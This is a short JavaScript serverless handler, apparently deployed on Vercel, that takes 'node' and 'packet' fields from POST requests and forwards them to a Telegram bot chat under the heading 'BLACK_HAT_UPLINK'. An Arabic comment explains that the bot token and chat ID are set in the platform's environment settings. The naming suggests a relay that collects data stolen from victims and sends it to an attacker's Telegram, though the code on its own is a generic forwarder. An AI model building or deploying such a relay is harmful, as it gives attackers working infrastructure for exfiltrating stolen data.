export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { node, packet } = req.body;
    
    // Vercel هيقرأ القيم دي من الإعدادات اللي هتعملها يدوي هناك
    const TOKEN = process.env.TG_TOKEN; 
    const CHAT_ID = process.env.TG_CHAT_ID;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🏴 **BLACK_HAT_UPLINK**\n\n👤 SOURCE: \`${node}\`\n📦 DATA:\n\`\`\`\n${packet}\n\`\`\``,
                parse_mode: "Markdown"
            })
        });

        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: 'Telegram API Error' });
        }
    } catch (error) {
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
